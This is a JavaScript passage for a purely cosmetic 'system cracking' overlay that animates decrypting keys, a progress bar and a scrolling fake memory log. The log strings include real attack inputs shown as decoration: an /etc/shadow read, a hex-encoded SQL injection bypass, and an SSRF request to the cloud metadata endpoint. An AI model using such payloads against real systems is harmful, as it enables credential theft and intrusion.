    const cyberChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~';

    function startCrackingOverlay() {
        if (!crackingOverlay) return;
        isCrackingOverlayActive = true;
        crackingOverlay.classList.add('visible');
        crackingPercentage.textContent = '00%';
        crackingLockStatus.textContent = 'LOCK_SECURED';
        crackingLockStatus.className = 'cracking-lock-status';
        crackingPhaseBadge.textContent = 'INITIALIZING';
        crackingFooterText.textContent = 'CONNECTING TO INTRUSION AGENTS...';
        crackingFooterBar.style.width = '0%';
        crackingStatusLight.className = 'cracking-status-light pulse-red';
        memoryStream.textContent = '';

        // Reset solver rows
        solverKeys.forEach(k => {
            if (k.element) {
                k.element.textContent = '●●●●●●●●';
                k.element.className = 'solver-value';
            }
        });

        // Start text decryption animation
        startSolverAnimations();

        // Start memory logs loop
        startMemoryStreamLogs();
    }

    function startSolverAnimations() {
        if (crackingSolveInterval) clearInterval(crackingSolveInterval);
        
        let frames = 0;
        crackingSolveInterval = setInterval(() => {
            if (!isCrackingOverlayActive) {
                clearInterval(crackingSolveInterval);
                return;
            }

            frames++;
            solverKeys.forEach((key, idx) => {
                if (!key.element) return;
                
                // Solve keys sequentially based on progress frames
                const threshold = (idx + 1) * 35;
                if (frames >= threshold) {
                    // Fully solved
                    key.element.textContent = key.target;
                    key.element.className = 'solver-value cracked';
                } else if (frames >= threshold - 30) {
                    // Currently deciphering (partially solved)
                    key.element.className = 'solver-value cracking';
                    let resolvedPart = '';
                    const progressRatio = (frames - (threshold - 30)) / 30;
                    const charCount = Math.floor(key.target.length * progressRatio);
                    
                    for (let i = 0; i < key.target.length; i++) {
                        if (i < charCount) {
                            resolvedPart += key.target[i];
                        } else {
                            resolvedPart += cyberChars[Math.floor(Math.random() * cyberChars.length)];
                        }
                    }
                    key.element.textContent = resolvedPart;
                } else {
                    // Locked
                    let dots = '';
                    for (let i = 0; i < 8; i++) {
                        dots += cyberChars[Math.floor(Math.random() * cyberChars.length)];
                    }
                    key.element.textContent = dots;
                }
            });
        }, 50);
    }

    function startMemoryStreamLogs() {
        const memAddressList = [
            '0x7FFE0348AF00', '0x7FFE0348AF08', '0x7FFE0348AF10', '0x7FFE0348AF18',
            '0x7FFE0348AF20', '0x7FFE0348AF28', '0x7FFE0348AF30', '0x7FFE0348AF38',
            '0x000000000000', '0x000000000008', '0x000000000010', '0x000000000018',
            '0x7FFF7BC01040', '0x7FFF7BC01088', '0x7FFF7BC010A0', '0x7FFF7BC010D8'
        ];

        const memPayloads = [
            'SYS_CALL: open() -> /etc/shadow [ACCESS_DENIED]',
            'EIP pointer jump to 0x7FFF7BC01040 (shellcode execution)',
            'Memory Taint flow detected: Form field "username" -> SQL execute() query',
            'Bypassing WAF rules with Hex encoding: %27%20%4f%52%20%27%31%27%3d%27%31',
            'SSRF simulation: requests.get("http://169.254.169.254/latest/meta-data/")',
            'Cracking bcrypt/md5 password hashes: wordlist.txt loading...',
            'AST Node traversal: AST_CallExpression -> os.system -> cmd.exe',
            'Sandbox isolation check: docker runtime detected? FALSE',
            'XSS payload reflection found: injection string mirrored on line 42',
            'Weak SSL/TLS handshake check: verifying server trust boundaries...',
            'Buffer overflow probe: payload overflow boundary AAAAAAAAAAAAAAAAAAA'
        ];

        function addMemLog() {
            if (!isCrackingOverlayActive || !memoryStream) return;

            const addr = memAddressList[Math.floor(Math.random() * memAddressList.length)];
            const payload = memPayloads[Math.floor(Math.random() * memPayloads.length)];
            const hex = Array.from({length: 8}, () => Math.floor(Math.random()*16).toString(16)).join('').toUpperCase();
            
            const logLine = `[${addr}]  [EAX:${hex}]  ${payload}\n`;
            memoryStream.textContent += logLine;
            
            // Keep logs truncated to fit inside pre component
            const lines = memoryStream.textContent.split('\n');
            if (lines.length > 9) {
                memoryStream.textContent = lines.slice(lines.length - 10).join('\n');
            }

            // Queue next log at dynamic intervals
            const nextInterval = 250 + Math.random() * 600;
            crackingOverlayTimer = setTimeout(addMemLog, nextInterval);
        }

        // Start recursion
        addMemLog();
    }

    function updateCrackingProgress(percentage, stageLabel, detailLabel) {
        if (!isCrackingOverlayActive) return;

        if (crackingPercentage) {
            crackingPercentage.textContent = String(Math.floor(percentage)).padStart(2, '0') + '%';
        }
        if (crackingFooterText) {
            crackingFooterText.textContent = `${stageLabel.toUpperCase()}: ${detailLabel}`;
        }
        if (crackingFooterBar) {
            crackingFooterBar.style.width = percentage + '%';
        }
        if (crackingPhaseBadge) {
            crackingPhaseBadge.textContent = stageLabel.replace(/_/g, ' ');
        }

        // Unlock styling when nearing completion
        if (percentage >= 80) {
            if (crackingLockStatus) {
                crackingLockStatus.textContent = 'SYSTEM_UNLOCKED';
                crackingLockStatus.className = 'cracking-lock-status unlocked';
            }
            if (crackingStatusLight) {
                crackingStatusLight.className = 'cracking-status-light pulse-green';
            }
        }
    }

    function stopCrackingOverlay() {
        isCrackingOverlayActive = false;
        if (crackingOverlayTimer) clearTimeout(crackingOverlayTimer);
        if (crackingSolveInterval) clearInterval(crackingSolveInterval);
        if (crackingOverlay) {
            crackingOverlay.classList.remove('visible');
        }
    }

    // Skip Animation Button click
    skipCrackBtn?.addEventListener('click', () => {
        stopCrackingOverlay();
    });

    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
});


